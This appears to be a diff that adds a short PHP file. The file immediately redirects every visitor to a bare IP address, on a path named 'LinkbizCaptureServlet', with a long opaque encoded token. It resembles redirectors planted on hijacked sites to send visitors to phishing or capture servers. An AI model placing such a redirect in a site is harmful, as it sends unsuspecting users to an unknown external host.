@@ -1,0 +1,5 @@
+<?php
+// Redirect to a different page
+header("Location: http://58.71.22.7/testegps/LinkbizCaptureServlet?lbpinst=zVUlX9ss%2F8b75VRejK42sDU15bMGhK%2Fl7kroLw5CTwN5vKNkk6smVLI8B2qDAD4%2FiigKzH00JmuoousB1FQtsSGNoeqECyXCJ6Bu8rHxPCvx84baqBdGV5%2BdHIPlbC2x%2BKEskKribIJH%2BuwzqnvAN6flLjx%2FgET%2FcLiGX7IjMer0vGsyQVaW8hyF2hr0%2B8Q%2B95BNXoOl3UWE1rs50E3NEfwS8IM4H15UiuEHVQCnrrknKQV%2BwQGkHz%2FJq3krorsLoM0pljOOdyqlFabUwtmdciOGVomkzeV7Eshl%2BKZiymjDWW7J73Ku9mOdrsVEdaKU6Cb2hWRlR3A8liEdb4G4bUkLP7gY2KwB%2BdfvEitem%2B4RtipgJ2abhRCru5gATiUWXjle6OHdYIH0h6th%2Bx1YDS1Wws%2B33%2F287TZpCc1XJF4z0LkaWYzr%2BSzfUtdlQKt4hO2kvNjGnhRLKvh64y4dSg%3D%3D");
+exit(); // Ensure that subsequent code is not executed after the redirect
+?>
